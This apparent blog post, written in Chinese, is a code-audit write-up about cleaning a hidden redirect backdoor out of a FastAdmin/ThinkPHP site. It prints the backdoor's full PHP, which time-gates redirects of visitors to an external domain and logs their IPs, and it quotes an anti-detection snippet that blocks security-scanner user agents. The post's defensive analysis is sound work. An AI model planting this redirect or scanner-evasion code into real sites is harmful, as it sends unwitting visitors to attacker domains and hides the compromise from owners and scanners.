---
title: 小鸟的FastAdmin-暗跳后门排查与清理小记
date: 2026-01-07 23:59:59
updated: 2026-01-08 00:35:00
slug: fastadmin-backdoor-cleanup
categories:
  - Code audit
---

### 写在前面
首先是小鸟遇到了个小同学....反馈说一套PHP源码有问题，~~作为多年的吃PHP（史）大王，就让我来看看~~...
某天突然发现：访问站点会在某些时间段**自动跳转到一个奇怪的域名**。

然后我就意识到：完蛋...这应该是暗跳后门了！
于是开始了一次（相对）认真一点的排查与清理记录，顺便给未来的鸟一个提醒：**代码审计真的很重要**。

### 现象
- 正常访问网站，大多数时候没事
- 但在特定时间段，页面会302/跳转到外部域名
- 更离谱的是：还会写本地日志（按 IP、按日期），像是在“控制跳转频率”

### 结论先行
后门埋在 [public/index.php](https://raw.gitcode.com/XiaYuanOwO/Blog-Fastadmin/raw/main/index.php) 的最顶部：  
它在 ThinkPHP 正常入口之前就 `header("Location: ..."); exit;` 了，所以框架层面再怎么配也挡不住。

### 后门长什么样（核心片段）
（下面是典型暗跳逻辑，已清理）

```php
<?php
function redirectRule(){
    $t='https://ztss.pw';
    $l='ip_time_log.txt';
    $f='first_visit.txt';
    $d=129600; // 36小时
    $r=[
        '00:17-00:22','00:43-00:48', /* ... */ '23:21-23:26'
    ];

    !file_exists($f) && file_put_contents($f,date('Y-m-d H:i:s'));
    if(strtotime(date('Y-m-d H:i:s'))-strtotime(trim(file_get_contents($f)))<$d) return;

    $ip=$_SERVER['REMOTE_ADDR'];
    $log=file_exists($l)?file($l,FILE_IGNORE_NEW_LINES):[];
    $m=[];
    foreach($log as $x){
        list($i,$rg,$dt)=explode('|',$x)+[null,null,null];
        $i && $dt==date('Y-m-d') && ($m[$i][]=$rg);
    }

    $cm=(int)date('H')*60+(int)date('i');
    foreach($r as $rg){
        list($s,$e)=explode('-',$rg);
        $sm=(int)substr($s,0,2)*60+(int)substr($s,3,2);
        $em=(int)substr($e,0,2)*60+(int)substr($e,3,2);
        $in=$sm<=$em?($cm>=$sm&&$cm<=$em):($cm>=$sm||$cm<=$em);

        if($in && !in_array($rg,$m[$ip]??[])){
            file_put_contents($l,$ip.'|'.$rg.'|'.date('Y-m-d').PHP_EOL,FILE_APPEND);
            header("Location:$t");exit;
        }
    }
}
redirectRule();
```

### 清理方式
清理策略很朴素：
- 直接把上面整段删掉
- 让 [public/index.php](https://raw.gitcode.com/XiaYuanOwO/Blog-Fastadmin/raw/main/index.php)
 回到标准的 ThinkPHP/FastAdmin 入口

清理后 [public/index.php](https://raw.gitcode.com/XiaYuanOwO/Blog-Fastadmin/raw/main/index.php) 开头类似这样：

```php
<?php
define('APP_PATH', __DIR__ . '/../application/');
if (!is_file(APP_PATH . 'admin/command/Install/install.lock')) {
    header("location:./install.php");
    exit;
}
require __DIR__ . '/../thinkphp/start.php';
```

### 深挖排查：我以为结束了，结果又看到了“反检测”
在前台控制器 [application/index/controller/Index.php](https://raw.gitcode.com/XiaYuanOwO/Blog-Fastadmin/raw/main/controller/Index.php)里，首页原本会调用一个函数：

```php
$this->txProtect(); // 反腾讯网址安全检测
```

这个 [txProtect()](https://raw.gitcode.com/XiaYuanOwO/Blog-Fastadmin/raw/main/controller/Index.php) 会按 IP 段、User-Agent、Referer 等特征直接 `exit()`：

```php
if (preg_match("/Alibaba.Security.Heimdall/", $_SERVER['HTTP_USER_AGENT'])) {
    exit('您的浏览器不支持');
}
```

说白了，这种逻辑就很像“为了绕过安全扫描/爬虫”的对抗式代码。  
所以我的处理方式是：**首页不再调用它**（先停用、保留函数本体，方便回滚）。

### 那个我一开始读不到的 runtime/temp 文件呢？
它其实是 ThinkPHP 的模板编译缓存，长这样：

```php
<?php if (!defined('THINK_PATH')) exit(); /*a:1:{s:77:".../Install/install.html";i:1709969850;}*/ ?>
```

内容是安装页的 HTML，不是木马。(放心ing)

### 加固建议（给用到这套源码的人）
- 安装完成后处理 [install.php]最好删掉，或直接禁止访问
- 入口文件只读：[public/index.php](https://raw.gitcode.com/XiaYuanOwO/Blog-Fastadmin/raw/main/index.php) / [public/console.php]
- 上传目录隔离：禁止上传目录解析PHP
- 日志与审计：入口文件hash变更告警

### 后记
这次算是被迫补了一课：  
~~“站能跑就行”不是运维理念，是侥幸心理！！一定要读好代码审计哇——~~。
也感谢自己多年的CTF经验和开发PHP经验了，一眼就锁定问题了ww（

